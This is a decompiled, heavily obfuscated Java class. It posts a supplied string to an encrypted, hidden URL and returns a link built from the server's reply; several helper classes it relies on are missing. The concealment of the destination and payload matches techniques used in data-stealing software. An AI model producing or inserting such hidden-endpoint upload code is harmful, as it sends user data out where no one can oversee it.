/*
 * Decompiled with CFR 0_123.
 */
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;

public class Mcik {
    public static String vsgc(String string) throws Exception {
        URL uRL = new URL(NVIs$JbpD.H("\uf578\u6dba\u1e3f\u9036\u4992\u83bd\u2dcb\u4276\u5c24\u26d8\ufeba\ud595\u9c5d\ue7c1\u23a3\u88ac\u86fc\u6d55\u1c1e\uc215\u4db4"));
        HttpURLConnection httpURLConnection = (HttpURLConnection)Mcik.Bk(uRL);
        Mcik.Bk(httpURLConnection, true);
        Mcik.Bk(httpURLConnection, NVIs$JbpD.H("\uf540\u6d81\u1e18\u9012"));
        Mcik.Bk(Mcik.Bk(httpURLConnection), (byte[])Mcik.Bk(string));
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader((InputStream)Mcik.Bk(httpURLConnection)));
        jhSC jhSC2 = new jhSC((String)Mcik.Bk(bufferedReader));
        return Mcik.Bk(Mcik.Bk(new StringBuilder(NVIs$JbpD.H("\uf578\u6dba\u1e3f\u9036\u4992\u83bd\u2dcb\u4276\u5c24\u26d8\ufeba\ud595\u9c5d\ue7c1\u23a3\u88ac\u86fc\u6d55\u1c1e\uc215\u4db4")), Mcik.Bk(jhSC2, NVIs$JbpD.H("\uf57b\u6dab\u1e32"))));
    }

    private static Object Bk(Object object, Object object2, Object object3) {
        try {
            return new ConstantCallSite(((MethodHandles.Lookup)object).unreflect(yy.X(Integer.valueOf((String)object2, 32))).asType((MethodType)object3));
        }
        catch (ClassNotFoundException | IllegalAccessException reflectiveOperationException) {
            throw new BootstrapMethodError(reflectiveOperationException);
        }
    }
}

